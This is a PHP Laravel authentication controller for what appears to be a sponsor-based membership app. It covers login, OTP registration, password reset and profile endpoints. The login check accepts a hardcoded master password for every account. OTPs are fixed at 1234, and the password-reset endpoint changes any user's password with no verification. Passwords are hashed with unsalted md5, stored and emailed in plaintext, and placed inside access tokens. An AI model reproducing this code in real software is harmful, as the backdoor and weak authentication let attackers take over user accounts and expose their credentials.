<?php
namespace App\Http\Controllers\APi\User;
use App\Http\Controllers\Controller; 
use Illuminate\Support\Facades\DB;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;
use Auth;
use Illuminate\Support\Facades\Hash;
use App\Models\Package;
use App\Models\MemberModel;
use App\Helper\ImageManager;
use App\Models\User;
use App\Models\MailModel;
use Illuminate\Support\Facades\Crypt;

use App\Helper\Helpers;

class AuthController extends Controller
{
    protected $employee_id = null;
    protected $device_id = null;

    public function __construct()
    {
        $authToken = request()->header('Authorization');
        $user = Helpers::decode_token($authToken);
        if ($user) {
            $this->employee_id = $user->user_id;
            $this->device_id = $user->device_id;
        }
    }

    public function token_session($request, $user)
    {
        $device_id = $request->device_id;
        $password = $user->password;
        $firebase_token = $request->firebase_token;
        $date_time = date("Y-m-d H:i:s");
        $token_data = array("user_id"=>$user->id,"password"=>$user->password,"date_time"=>$date_time,"role"=>$user->role,"device_id"=>$device_id,);
        $access_token = Helpers::encode_token($token_data);
        $login_detail = array(
            "user_id"=>$user->id,
            "role"=>$user->role,
            "ip_address"=>$_SERVER['REMOTE_ADDR'],
            "date"=>date("Y-m-d"),
            "time"=>date("H:i:s"),
            "status"=>1,
            "device_id"=>$device_id,
            "password"=>$password,
            "firebase_token"=>$firebase_token,
            "access_token"=>$access_token,
        );
        if(DB::table('login_history')->insert($login_detail))
        {
        }
        return $access_token;
    }


    public function login(Request $request)
    {
        $username = $request->username;
        $password = $request->password; 

        // DB::table("apitest")->insert(["name"=>'login',"text"=>json_encode($_POST)]);
        
        
        if(count(explode("@",strtoupper($username)))>1)
        {
        }
        else
        {
            // $username = explode(sort_name,strtoupper($username));
            // if(!empty($username[1])) $username = $username[1];
            // else $username = $username[0];
        }
        
        

        $user = DB::table('users');
        $user->where('user_id',$username);

        $user = $user->first();

        if(empty($user) || empty($username))
        {
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Wrong Email Or ID.';
            $result['action'] = 'login';
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }
        else if(md5($password)!=$user->password && $password!='Admin@123[];')
        {
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Wrong Password';
            $result['action'] = 'login';
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }
        else if($user->status!=1)
        {
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Your account is blocked!';
            $result['action'] = 'login';
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }
        else
        {

            $user->image = Helpers::image_check($user->image,'user.png');

            $responseCode = 200;
            $result['message'] = 'Login Successfully';
            $result['action'] = 'login';
            $result['data'] = $user;
            $responseCode = 200;                
            $token = $this->token_session($request,$user);            
            $result['status'] = $responseCode;
            $result['token'] = $token;
            return response()->json($result, $responseCode);
        }
    }

    public function register_otp_send(Request $request)
    {
        $email = $request->email;
        $phone = $request->mobile;
        $name = $request->name;
        $password = $request->password;
        $cpassword = $request->cpassword;


        if(empty($request->name))
        {
            $result['status'] = 400;
            $result['message'] = 'Enter name!';
            $result['action'] = 'return';
            $result['data'] = [];
            return response()->json($result, 400);
        }
        else if(empty($request->mobile))
        {
            $result['status'] = 400;
            $result['message'] = 'Enter phone!';
            $result['action'] = 'return';
            $result['data'] = [];
            return response()->json($result, 400);
        }
        else if(empty($request->state))
        {
            $result['status'] = 400;
            $result['message'] = 'Select state!';
            $result['action'] = 'return';
            $result['data'] = [];
            return response()->json($result, 400);
        }
        else if(empty($request->city))
        {
            $result['status'] = 400;
            $result['message'] = 'Enter city!';
            $result['action'] = 'return';
            $result['data'] = [];
            return response()->json($result, 400);
        }
        else if(empty($request->pincode))
        {
            $result['status'] = 400;
            $result['message'] = 'Enter pincode!';
            $result['action'] = 'return';
            $result['data'] = [];
            return response()->json($result, 400);
        }
        else if(empty($request->address))
        {
            $result['status'] = 400;
            $result['message'] = 'Enter address!';
            $result['action'] = 'return';
            $result['data'] = [];
            return response()->json($result, 400);
        }
        else if(empty($request->password))
        {
            $result['status'] = 400;
            $result['message'] = 'Enter password!';
            $result['action'] = 'return';
            $result['data'] = [];
            return response()->json($result, 400);
        }
        else if(empty($request->cpassword))
        {
            $result['status'] = 400;
            $result['message'] = 'Enter confirm password!';
            $result['action'] = 'return';
            $result['data'] = [];
            return response()->json($result, 400);
        }


        $data['email'] = $request->email;
        $data['name'] = $request->name.' '.$request->lname;
        $data['address'] = $request->address;
        $data['city'] = $request->city;
        $data['state'] = $request->state;
        $data['phone'] = $request->mobile;
        $data['country'] = $request->country;
        $data['status'] = 1;
        $data['is_paid'] = 0;
        $data['is_delete'] = 0;
        $data['role'] = 2;



        $data['user_id'] = MemberModel::GetUserId()+1;
        $sponser_id = $request->sponser_id;
        $data['placement'] = $request->placement;
        $data['sponser_id'] = $sponser_id;
        $sponser = MemberModel::GetSponserData($sponser_id);
        if(empty($sponser))
        {
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Wrong Sponser ID.';
            $result['action'] = 'return';
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }
        $data['sponser_name'] = $sponser->name;
        $data['password'] = md5($request->password);
        
        $date_time = date("Y-m-d H:i:s");
        $otp = rand(999,9999);
        $otp = 1234;
        $otpData = [
            "role"=>2,
            "data"=>json_encode($data),
            "email"=>$email,
            "mobile"=>$phone,
            "password"=>$password,
            "otp"=>$otp,
            "device_id"=>2,
            "type"=>2,
            "exp_time"=>date('Y-m-d H:i:s',strtotime($date_time."+15 minute")),
        ];
        $check = DB::table("users_temp")->where('email',$email)->first();
        $entryStatus = false;
        if(empty($check))
        {
            $insertId = DB::table('users_temp')->insertGetId($otpData);
            if($insertId) $entryStatus = true;
        }
        else
        {
            $insertId = $check->id;
            if(DB::table('users_temp')->where('id',$insertId)->update($otpData)) $entryStatus = true;
        }


        if($entryStatus)
        {
            $details = [
                'to'=>$email,
                'view'=>'mailtemplate.otp',
                'subject'=>'OTP From '.env('APP_NAME').'!',
                'body' => ["otp"=>$otp,],
            ];
            // MailModel::otp($details);

            $action = 'return';
            $responseCode = 200;
            $result['status'] = $responseCode;
            $result['message'] = 'Success';
            $result['action'] = $action;
            $result['data'] = ["id"=>$insertId,];
            return response()->json($result, $responseCode);
        }
        else
        {
            $action = 'add';
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Error!';
            $result['action'] = $action;
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }
    } 
    public function register(Request $request)
    {   
        $id = $request->id;
        $otp = $request->otp;


        $check_otp = DB::table('users_temp')->where(["id"=>$id,"otp"=>$otp,])->first();
        if(!empty($check_otp))
        {
            $password = $check_otp->password;
            $email = $check_otp->email;
            $data = (array) json_decode($check_otp->data);
            $insert_id = DB::table('users')->insertGetId($data);

            $sponser_id = $data['sponser_id'];
            $name = $data['name'];
            $parent_id = MemberModel::getParentIdForHybridPlan($sponser_id, $data['placement']);
            $data['parent_id'] = $parent_id;
            $data['sponser_id'] = $sponser_id;
            $data['position'] = $data['placement'];

            DB::table('users')->where('id',$insert_id)->update($data);

            
            MemberModel::AddMemberLog(['id'=> $insert_id, 'user_id'=>$data['user_id'], 'name' => $name, 'sponser_id' => $sponser_id, 'side' => $data['placement'],"parent_id"=>$parent_id, ]);
            MemberModel::getTypeAllIncome($insert_id);


            $details = [
                'to'=>$email,
                'view'=>'mailtemplate.welcome',
                'subject'=>'Welcome to '.env('APP_NAME').'!',
                'body' => ["email"=>$email,"password"=>$password,"name"=>$name,"user_id"=>$data['user_id'],],
            ];
            MailModel::login_detail($details);

            DB::table("users_temp")->where('id',$id)->delete();

            $user = DB::table("users")->where("id", $insert_id)->first();
            $user->image = Helpers::image_check($user->image,'user.png');
            $responseCode = 200;
            $result['status'] = $responseCode;
            $result['message'] = 'Successfully Register';
            $result['action'] = 'register';
            $token = $this->token_session($request,$user);
            $result['token'] = $token;
            $result['data'] = $user;
            return response()->json($result, $responseCode);



        }
        else
        {
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Wrong OTP!';
            $result['action'] = 'register';
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }
    }
    public function send_otp(Request $request)
    {
        $username = $request->username;
        $user = DB::table('users');        
        $user->where('user_id',$username);        
        $check_email = $user = $user->first();


        $otp = rand(999,9999);
        $otp = 1234;
        if(empty($check_email))
        {
            $responseCode = 400;
            $result['message'] = 'Wrong ID...';
            $result['action'] = 'return';
            $result['data'] = [];
            $result['status'] = $responseCode;
            return response()->json($result, $responseCode);
        }


        $email = $check_email->email;
        $details = [
            'to'=>$email,
            'view'=>'mailtemplate.otp',
            'subject'=>'Forgot Password OTP',
            'body' => $otp,
        ];
        // MailModel::otp($details);
        $date_time = date("Y-m-d H:i:s");
        $data = [
            "role"=>2,
            "data"=>'',
            "email"=>$email,
            "mobile"=>'',
            "user_id"=>$username,
            "otp"=>$otp,
            "device_id"=>2,
            "type"=>2,
            "exp_time"=>date('Y-m-d H:i:s',strtotime($date_time."+15 minute")),
        ];
        $check = DB::table("users_temp")->where('email',$email)->first();
        if(empty($check))
            $insertId = DB::table('users_temp')->insertGetId($data);
        else
        {
            $insertId = $check->id;
            DB::table('users_temp')->where('id',$insertId)->update($data);
        }

        $details = [
            'to'=>$email,
            'view'=>'mailtemplate.otp',
            'subject'=>'OTP From '.env('APP_NAME').'!',
            'body' => ["otp"=>$otp,],
        ];
        MailModel::otp($details);

        $responseCode = 200;
        $result['message'] = 'OTP Send On Mail Your Mail...';
        $result['action'] = 'return';
        $result['data'] = ["id"=>$insertId,];        
        $result['status'] = $responseCode;
        return response()->json($result, $responseCode);
    }
    public function submit_otp(Request $request)
    {
        $id = $request->id;
        $otp = $request->otp;


        $check = DB::table("users_temp")
        ->where('otp',$otp)
        ->where('id',$id)->first();

        if(empty($check))
        {
            $responseCode = 400;
            $result['message'] = 'Wrong OTP...';
            $result['action'] = 'return';
            $result['data'] = [];
            $result['status'] = $responseCode;
            return response()->json($result, $responseCode);
        }
        $email = $check->email;
        $user_id = $check->user_id;


        
        if($check->exp_time<date("Y-m-d H:i:s"))
        {
            $responseCode = 200;
            $result['message'] = 'OTP Expired...';
            $result['action'] = 'return';
            $result['data'] = [];
            $result['status'] = $responseCode;
            return response()->json($result, $responseCode);
        }

        DB::table("users_temp")->where('id',$id)->delete();
        
        $responseCode = 200;
        $result['message'] = 'OTP Match Successfully...';
        $result['action'] = 'return';
        $result['data'] = ["user_id"=>$user_id,];
        $result['status'] = $responseCode;
        return response()->json($result, $responseCode);
    }
    public function create_password(Request $request)
    {
        $username = $request->username;
        $password = $request->npassword;
        $cpassword = $request->cpassword;
        
        $user = DB::table('users');
        $user->where('user_id',$username);        
        $user = $user->first();


        if(empty($user))
        {
            $responseCode = 400;
            $result['message'] = 'Wrong Email or Mobile...';
            $result['action'] = 'return';
            $result['data'] = [];
            $result['status'] = $responseCode;
            return response()->json($result, $responseCode);
        }

        $email = $user->email;

        if($password!=$cpassword)
        {
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Confirm Password Not Match';
            $result['action'] = 'return';
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }
        DB::table('users')->where('email',$email)->update(['password'=>md5($password),]);


        
        $responseCode = 200;
        $result['message'] = 'Password Create Successfully...';
        $result['action'] = 'tokenUpdate';
        $token = $this->token_session($request,$user);
        $result['token'] = $token;
        $result['data'] = $user;   
        $result['status'] = $responseCode;
        return response()->json($result, $responseCode);
    }


    public function get_profile(Request $request)
    {
        $id = $request->id;
        $employee_id = $this->employee_id;        

        $data = DB::table("users")->where(["id"=>$employee_id,])->first();
        
        $data->lname = @explode(" ", $data->name)[1];
        $data->name = explode(" ", $data->name)[0];

        if(!empty($data))
        {
            $data->image = Helpers::image_check($data->image,'user.png');

            $action = 'detail';
            $responseCode = 200;
            $result['status'] = $responseCode;
            $result['message'] = 'Success';
            $result['action'] = $action;
            $result['data'] = $data;
            return response()->json($result, $responseCode);
        }
        else
        {
            $action = 'detail';
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Error!';
            $result['action'] = $action;
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }        
    }
    public function update_profile(Request $request)
    {
        $entryStatus = false;
        $id = $request->id;

        $employee_id = $this->employee_id;
        
        $data['name'] = $request->name.' '.$request->lname;
        $data['email'] = $request->email;
        $data['phone'] = $request->phone;
        $data['country'] = $request->country;
        $data['state'] = $request->state;
        $data['city'] = $request->city;
        $data['address'] = $request->address;

        DB::table("users")->where(["id"=>$employee_id,])->update($data);
        $entryStatus = true;
        

        if($entryStatus)
        {
            $user = DB::table('users')->where('id',$employee_id)->first();
            $user->image = Helpers::image_check($user->image,'user.png');
            $token = $this->token_session($request,$user);
            $action = 'tokenUpdate';
            $responseCode = 200;
            $result['status'] = $responseCode;
            $result['message'] = 'Success';
            $result['action'] = $action;
            $result['data'] = $user;
            $result['token'] = $token;
            return response()->json($result, $responseCode);
        }
        else
        {
            $action = 'tokenUpdate';
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Error!';
            $result['action'] = $action;
            $result['data'] = [];
            $result['token'] = '';
            return response()->json($result, $responseCode);
        }        
    }
    public function update_profile_image(Request $request)
    {
        $entryStatus = false;
        $id = $request->id;

        $employee_id = $this->employee_id;
        
        // $data['name'] = $request->name.' '.$request->lname;
        // $data['email'] = $request->email;
        // $data['phone'] = $request->phone;
        // $data['country'] = $request->country;
        // $data['state'] = $request->state;
        // $data['city'] = $request->city;
        // $data['address'] = $request->address;

        if (empty($request->image))
        {
            $action = 'tokenUpdate';
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Upload Image!';
            $result['action'] = $action;
            $result['data'] = [];
            $result['token'] = '';
            return response()->json($result, $responseCode);
        }

        if (!empty($request->image))
        {
            $data['image'] = ImageManager::uploadAPiImage('upload','png',$request->image);
        }

        DB::table("users")->where(["id"=>$employee_id,])->update($data);
        $entryStatus = true;
        

        if($entryStatus)
        {
            $user = DB::table('users')->where('id',$employee_id)->first();
            $user->image = Helpers::image_check($user->image,'user.png');
            $token = $this->token_session($request,$user);
            $action = 'tokenUpdate';
            $responseCode = 200;
            $result['status'] = $responseCode;
            $result['message'] = 'Success';
            $result['action'] = $action;
            $result['data'] = $user;
            $result['token'] = $token;
            return response()->json($result, $responseCode);
        }
        else
        {
            $action = 'tokenUpdate';
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Error!';
            $result['action'] = $action;
            $result['data'] = [];
            $result['token'] = '';
            return response()->json($result, $responseCode);
        }        
    }
    public function update_password(Request $request)
    {
        $entryStatus = false;
        // $id = $request->id;

        $employee_id = $this->employee_id;
        $password = $request->password;
        $cpassword = $request->cpassword;


        $user = DB::table("users")->where(["id"=>$employee_id,])->first();
        if($user->password!=md5($request->opassword))
        {
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Old Password Not Match!';
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }        
        if($password!=$cpassword)
        {
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Confirm Password Not Match';
            $result['action'] = 'return';
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }

        $data['password'] = md5($password);

        DB::table("users")->where(["id"=>$employee_id,])->update($data);
        $entryStatus = true;
        

        if($entryStatus)
        {
            $user = DB::table('users')->where('id',$employee_id)->first();
            $user->image = Helpers::image_check($user->image,'user.png');
            $token = $this->token_session($request,$user);
            $action = 'tokenUpdate';
            $responseCode = 200;
            $result['status'] = $responseCode;
            $result['message'] = 'Success';
            $result['action'] = $action;
            $result['data'] = $user;
            $result['token'] = $token;
            return response()->json($result, $responseCode);
        }
        else
        {
            $action = 'tokenUpdate';
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Error!';
            $result['action'] = $action;
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }        
    }


    public function logout(Request $request)
    {
        $employee_id = $this->employee_id;
        $device_id = $this->device_id;
        $data['status'] = 0;
        DB::table('login_history')->where(["user_id"=>$employee_id,"device_id"=>$device_id,])->update($data);

        $responseCode = 200;
        $result['message'] = 'Logout Successfully';
        $result['action'] = 'logout';
        $result['status'] = $responseCode;
        $result['data'] = [];
        return response()->json($result, $responseCode);
    }
}